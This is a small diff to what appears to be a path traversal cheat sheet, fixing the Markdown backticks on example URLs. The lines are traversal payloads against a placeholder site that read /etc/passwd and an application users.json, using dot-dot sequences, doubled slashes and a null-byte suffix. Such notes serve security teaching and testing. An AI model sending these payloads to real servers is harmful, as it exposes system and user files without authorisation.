@@ -8,5 +8,5 @@ we can exploit this vulnerability by  parsing through directories via path
 
 * `https://www.target.com/file?path=/etc/passwd` 
 * `https://www.target.com/file?path=/images/img.svg/../../../../../etc/passwd`
-* `https://www.target.com/file?path=/images/img.svg//..//..//..//..//..//..//etc//passwd
-* `https://www.target.com/file?path=/opt/application/users.json%00
+* `https://www.target.com/file?path=/images/img.svg//..//..//..//..//..//..//etc//passwd`
+* `https://www.target.com/file?path=/opt/application/users.json%00`
